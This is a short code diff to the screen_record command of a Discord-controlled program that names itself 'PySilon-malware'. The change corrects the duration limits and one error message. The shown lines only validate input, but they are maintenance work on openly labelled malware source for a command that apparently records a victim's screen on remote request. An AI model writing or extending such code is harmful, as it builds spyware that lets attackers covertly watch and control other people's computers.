@@ -12,10 +12,10 @@ async def screen_record(ctx, duration=None):
         except:
             return
         if duration > 60:
-            embed = discord.Embed(title="📛 Error",description="Duration interval should not surpass 100 seconds!", colour=discord.Colour.red())
+            embed = discord.Embed(title="📛 Error",description="Duration interval should not surpass 60 seconds!", colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             return await ctx.send(embed=embed)
-        elif duration < 0:
+        elif duration < 1:
             embed = discord.Embed(title="📛 Error",description="Duration interval should be a non negative number!", colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             return await ctx.send(embed=embed)
